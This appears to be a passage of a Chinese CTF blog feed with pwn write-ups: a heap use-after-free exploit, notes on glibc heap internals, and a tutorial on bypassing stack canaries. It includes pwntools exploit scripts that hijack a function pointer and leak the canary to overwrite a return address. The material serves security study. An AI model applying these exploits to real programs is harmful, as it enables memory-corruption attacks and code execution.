alt="后门函数"></p><p>我们十分想调用这个诱人且友好的后门函数，但是怎么调用呢，这是个问题，我们知道使用打印内容功能的时候，会调用打印函数，如果调用打印函数的地址改为后门函数的地址那就好了，我们尝试一下</p><p>如果想改变控制堆块的print地址，我们就想办法，把控制堆块变成内容堆块，然后输入后门函数地址覆盖掉print的地址。</p><p>利用思路如下：</p><ul><li>申请note0 大小为0x10(只要大小和控制堆块大小不一样就行)</li><li>申请note1 大小为0x10(同上)</li><li>释放note0</li><li>释放note1</li><li>此时大小为0x10的fast bin中链表为note1 -&gt; note0 </li><li>申请note2 大小为0x8，那么根据堆的分配规则</li><li>note2的控制堆块分配note1的控制堆块，内容堆块分配note0的控制堆块</li><li>这时候我们向note2输入信息，就会储存再note0的控制堆块</li><li>由于我们的note0没有被赋值为NULL，存在UAF漏洞，所以我们还可以使用note0</li><li>当再次掉用note0的打印功能的时候，此时已经被我们覆盖为后门函数，那么就可以直接调用后门函数</li></ul><p>OK了兄弟们，是不是非常神奇，一个简单的题，都要很巧妙的利用</p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn141_1804&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdb.attach(p, gdbscript=<span class="hljs-string">&quot;b * main&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;bbbb&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(use))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次艰难的堆探索</title>
    <link href="/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="堆的认识"><a href="#堆的认识" class="headerlink" title="堆的认识"></a>堆的认识</h1><h2 id="初始堆"><a href="#初始堆" class="headerlink" title="初始堆"></a>初始堆</h2><ul><li>是虚拟地址空间的的 一块连续的线性区域</li><li>提供动态分配的内存，允许程序申请大小未知的内存</li><li>在用户与操作系统之间，作为动态内存管理的中间人</li><li>响应用户的申请内存请求， 向操作系统申请内存，然后将其返回给用户程序</li><li>管理用户所释放的内存，适 时归还给操作系统</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262317234.png"></p><ol><li>堆区域为Data上边，增长方向为低地址到高地址 </li><li>shared libraries也是堆区域</li></ol><h2 id="申请内存的系统调用"><a href="#申请内存的系统调用" class="headerlink" title="申请内存的系统调用"></a>申请内存的系统调用</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262321375.png"></p><ol><li>对于主线程可以用brk、mmap申请栈空间</li><li>对于子线程只能用mmap申请栈空间</li><li>brk申请空间是把data上面的heap向上增长，mmap申请空间是在物理内存映射到虚拟地址</li></ol><h2 id="堆管理器与用户的交互"><a href="#堆管理器与用户的交互" class="headerlink" title="堆管理器与用户的交互"></a>堆管理器与用户的交互</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>内存分配区，可以理解为堆管理器所持有的内存池</p><p>操作系统–&gt;堆管理器–&gt;用户</p><p>物理内存–&gt;arena–&gt;可用内存</p><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发下来的有有冗余的内存库存</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262338592.png"></p><h2 id="堆的基本单位chunk"><a href="#堆的基本单位chunk" class="headerlink" title="堆的基本单位chunk"></a>堆的基本单位chunk</h2><p>用户申请内存的单位，也是堆管理器管理内存的基本单位，malloc()返回指针指向一个chunk的数据区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs [c]">struct malloc_chunk &#123;<br><br>  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */<br>  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */<br><br>  struct malloc_chunk* fd;         /* double links -- used only if free. */<br>  struct malloc_chunk* bk;<br><br>  /* Only used for large blocks: pointer to next larger size.  */<br>  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */<br>  struct malloc_chunk* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="mallco-chunk"><a href="#mallco-chunk" class="headerlink" title="mallco chunk"></a>mallco chunk</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262344788.png"></p><ul><li>prve_size ：表示前一个已经释放的chunk的大小，当前一个chunk没有释放时，无意义</li><li>size ：表示自身chunk的大小，有三个标志位A、M、P<ul><li>A ：chunk 是否属于主线程，1表示不属于，0表示属于</li><li>M ：chunk是否用由mmap系统调用分配，1表示是，0表示不是</li><li>P ：chunk前一个chunk是否在使用，1表示在使用，0表示被释放</li></ul></li><li></li></ul><h2 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h2><h3 id="fastbin-free-chunk"><a href="#fastbin-free-chunk" class="headerlink" title="fastbin free chunk"></a>fastbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271527975.png"></p><h3 id="smallbin-free-chunk"><a href="#smallbin-free-chunk" class="headerlink" title="smallbin free chunk"></a>smallbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270001044.png"></p><h3 id="lagerbin-free-chunk"><a href="#lagerbin-free-chunk" class="headerlink" title="lagerbin free chunk"></a>lagerbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270010770.png"></p><h2 id="bin机制"><a href="#bin机制" class="headerlink" title="bin机制"></a>bin机制</h2><h3 id="bin链的保存（struct-malloc-state结构体）"><a href="#bin链的保存（struct-malloc-state结构体）" class="headerlink" title="bin链的保存（struct_ malloc_state结构体）"></a>bin链的保存（struct_ malloc_state结构体）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs [c]">typedef struct malloc_chunk* mchunkptr;<br>typedef struct malloc_chunk *mfastbinptr;<br>/**<br> * 全局malloc状态管理<br> */<br>struct malloc_state<br>&#123;<br>  /* Serialize access. 同步访问互斥锁 */<br>  __libc_lock_define (, mutex);<br> <br>  /* Flags (formerly in max_fast).<br>   * 用于标记当前主分配区的状态<br>   *  */<br>  int flags;<br> <br>  /* Set if the fastbin chunks contain recently inserted free blocks.  */<br>  /* Note this is a bool but not all targets support atomics on booleans.  */<br>  /* 用于标记是否有fastchunk */<br>  int have_fastchunks;<br> <br>  /* Fastbins fast bins。<br>   * fast bins是bins的高速缓冲区，大约有10个定长队列。<br>   * 当用户释放一块不大于max_fast（默认值64）的chunk（一般小内存）的时候，会默认会被放到fast bins上。<br>   * */<br>  mfastbinptr fastbinsY[NFASTBINS];<br> <br>  /* Base of the topmost chunk -- not otherwise kept in a bin */<br>  /* Top chunk ：并不是所有的chunk都会被放到bins上。<br>   * top chunk相当于分配区的顶部空闲内存，当bins上都不能满足内存分配要求的时候，就会来top chunk上分配。 */<br>  mchunkptr top;<br> <br>  /* The remainder from the most recent split of a small request */<br>  mchunkptr last_remainder;<br> <br>  /* Normal bins packed as described above<br>   * 常规 bins chunk的链表数组<br>   * 1. unsorted bin：是bins的一个缓冲区。当用户释放的内存大于max_fast或者fast bins合并后的chunk都会进入unsorted bin上<br>   * 2. small bins和large bins。small bins和large bins是真正用来放置chunk双向链表的。每个bin之间相差8个字节，并且通过上面的这个列表，<br>   * 可以快速定位到合适大小的空闲chunk。<br>   * 3. 下标1是unsorted bin，2到63是small bin，64到126是large bin，共126个bin<br>   * */<br>  mchunkptr bins[NBINS * 2 - 2];<br> <br>  /* Bitmap of bins<br>   * 表示bin数组当中某一个下标的bin是否为空，用来在分配的时候加速<br>   * */<br>  unsigned int binmap[BINMAPSIZE];<br> <br>  /* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */<br>  struct malloc_state *next;<br> <br>  /* 分配区空闲链表 Linked list for free arenas.  Access to this field is serialized<br>     by free_list_lock in arena.c.  */<br>  struct malloc_state *next_free;<br> <br>  /* Number of threads attached to this arena.  0 if the arena is on<br>     the free list.  Access to this field is serialized by<br>     free_list_lock in arena.c.  */<br>  INTERNAL_SIZE_T attached_threads;<br> <br>  /* Memory allocated from the system in this arena.  */<br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>实际编译后这个结构体就是arena</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271319241.png"></p><ul><li><p><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链。<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271321437.png"></p></li><li><p><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）。<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271332431.png"></p></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast bin是ptmalloc为了解决用户频繁的创建空间还能快速响应的结构</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270032625.png"></p><p>表头为物理连接，每个bin链为逻辑连接，用bk指针</p><h4 id="fast-bin特点"><a href="#fast-bin特点" class="headerlink" title="fast bin特点"></a>fast bin特点</h4><ul><li>采用LIFO策略，和栈类似，为单链表结构</li><li>chunk的inuse bit永远是1。应为fast bin会被频繁使用，所以fast bin是不参与合并的，</li></ul><hr><p>今后学到补充补充</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过保护之Canary</title>
    <link href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/"/>
    <url>/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/</url>
    
    <content type="html"><![CDATA[<h1 id="初识Canary"><a href="#初识Canary" class="headerlink" title="初识Canary"></a>初识Canary</h1><p><strong>关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下</strong><br><strong>函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><p><strong>函数结束时，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346584.png"></p><p><strong>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，这个函数不同的libc会不同（从glibc开始 2.27后稍有不同）定义如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>在没有开启FULL RELRO保护时，我们可以通过劫持GOT表，然后触发Canary检测报错，这时就会进入劫持的地址。另一种是利用fortify_fail函数打印关键信息</strong><br><strong>关于Canary的储存地址，对于Liunx来说，fs寄存器实际指向的是当前进程的TLS结构，fs：0x28指向的正式stack_guard。如果溢出条件合适，我们完全可以覆盖TLS中保存的Canary值</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p><strong>这个值由ssecurity_init函数来初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><p><strong>Canary的最后一个字节呗设置为0，防止类似与printf(“%s” , &amp;buf)，形式的函数不小心打印出来，所以我们可以把这个0给覆盖，用打印函数来覆盖，这样就泄露了Canary的值</strong></p><h1 id="Canary保护机制总结"><a href="#Canary保护机制总结" class="headerlink" title="Canary保护机制总结"></a>Canary保护机制总结</h1><ol><li><strong>_dl_random由Kernel写入</strong></li><li><strong>security_init 函数将_dl_random 的最后一个字节设置为0，防止 printf(“%s”)这类打印函数不小心泄露 Canary。</strong></li><li><strong>security_init 函数将 Canary 值设置到 TLS 中。</strong></li><li><strong>在函数开始时，会取出TLS中的Canary值放在ebp-4h(64位系统为rbp-8h)<br>中，即防止通过栈溢出修改 ebp 和返回地址。</strong></li><li><strong>在函数结束时，会取出ebp-4h(64位系统为rbp-8h)的值，并与 TLS 中的 Canar值进行异或，判断是否为0。若结果为0，则检查通过;若结果不为0，则检查不通过，进人stack_chk_fail 函数</strong></li></ol><h2 id="Canary保护机制主要有两个漏洞"><a href="#Canary保护机制主要有两个漏洞" class="headerlink" title="Canary保护机制主要有两个漏洞"></a>Canary保护机制主要有两个漏洞</h2><ul><li><strong>stack_chk_fai1函数会有信息输出，如果我们能够控制 libc_argv[0]，就能够通过stack_chk fail函数泄露出我们想要的信息，这个技术被称为 stacksmashes(glibc 2.27 和 2.27之后的版本会有一些变化)。</strong></li><li>如果我们有一个很长的栈溢出，那么可以直接溢出TLS 中的 a1_random 的值，因此可以绕过 Canary 保护。当然，这里可能还需要一个多线程的条件，可以在后续例<br>题中看到。</li></ul><h2 id="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："><a href="#对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：" class="headerlink" title="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："></a>对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：</h2><ol><li><strong>利用泄露函数泄露出 Canary 的值，再进行利用。</strong></li><li><strong>爆破得到 Canary 的值。</strong></li><li><strong>stack_chk fai1 函数泄露关键信息。</strong></li><li><strong>修改 TLS 中的 stack quard 值。</strong></li></ol><h1 id="泄露Canary值"><a href="#泄露Canary值" class="headerlink" title="泄露Canary值"></a>泄露Canary值</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">附件下载</a></strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347433.png"><br><strong>注意点Canary值距离ebp为0xc，然后通过栈溢出覆盖最后一位0，通过打印函数打印出来cancary</strong></p><ol><li><strong>第一种是用栈溢出漏洞</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li><li>第二种是利用格式化字符串<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 